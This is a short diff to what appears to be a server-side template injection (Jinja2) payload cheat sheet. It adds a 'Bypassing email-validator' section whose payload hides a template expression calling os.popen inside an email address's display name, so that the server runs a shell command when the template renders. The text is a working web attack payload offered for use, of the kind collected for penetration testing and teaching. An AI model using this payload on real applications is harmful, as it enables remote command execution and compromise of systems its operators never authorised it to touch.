@@ -260,6 +260,11 @@ In another GET parameter include a variable named "input" that contains the comm
 request.__class__
 request["__class__"]
 ```
+Bypassing email-validator
+
+```python
+"Smith+{{lipsum.__globals__.os.popen('/file').read()}}"+<smith@example.com>
+```
 
 Bypassing `_`
 
